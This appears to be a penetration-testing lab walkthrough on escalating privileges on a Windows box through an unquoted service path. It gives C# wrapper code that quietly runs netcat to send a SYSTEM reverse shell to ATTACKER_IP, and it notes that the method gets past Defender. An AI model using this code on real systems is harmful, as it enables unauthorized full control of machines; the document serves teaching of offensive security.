Let's recap what we found in the previous task:

- We have a privilege which we could almost certainly use to escalate to system permissions. The downside is that we'd need to obfuscate the exploits in order to get them past Defender.
- We have an unquoted service path vulnerability for a service running as the system account. This is ideal.

We have everything we need to root this box. Let's do this!

Of the two vulnerabilities that are immediately available, we will work through the *unquoted service path attack* for one simple reason: getting a reverse shell back from this is _very_ easy -- even with Defender in play. 

The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._ To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. 

Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It's worth noting that this technique is effective at bypassing the antivirus software on the target; however, *in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system*. In this scenario we would be looking for a more sophisticated (if similar) solution.

Ideally we'd be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the `mono` dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.

---
## Install mono

First we need to install Mono. This can be done with:  

```
sudo apt update
sudo apt install mono-devel -y
```


If you are using the AttackBox then this should already be installed.  

## Create Wrapper.cs

Now, open a file called `Wrapper.cs` in your favourite text editor.

The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:  
`using System;   using System.Diagnostics;   `  

These allow us to start new processes (i.e. execute netcat).

Next we need to initialise a namespace and class for the program:  

```
namespace Wrapper{       
	class Program{           
		static void Main(){
			//Our code will go here!
		}
	}
}
```

We can now write the code that will call netcat. This goes inside the `Main()` function (replacing the `//Our code will go here!` line).

First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:  

```
Process proc = new Process();   
ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
```

_Make sure to replace the_ `nc-USERNAME.exe` _with the name of your own netcat executable, as well as slotting in your own IP and Port!_

With the objects created, we can now configure the process to not create it's own GUI Window when starting:  
`procInfo.CreateNoWindow = true;`  

Finally, we attach the `ProcessStartInfo` object to the process, and start the process!  
`proc.StartInfo = procInfo;   proc.Start();`  

Our program is now complete. It should look something like this:

![[1680d2c86ef0.png]]

## Compile

We can now compile our program using the Mono `mcs` compiler. This is extremely simple using the package we installed earlier:

```
mcs Wrapper.cs
```

![[f051e39d81f6.png]]

Write and compile a wrapper program using Mono or Visual Studio.

## Transfer Wrapper.exe

Transfer the `Wrapper.exe`   file to the target. Just to spice things up a bit, let's use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.

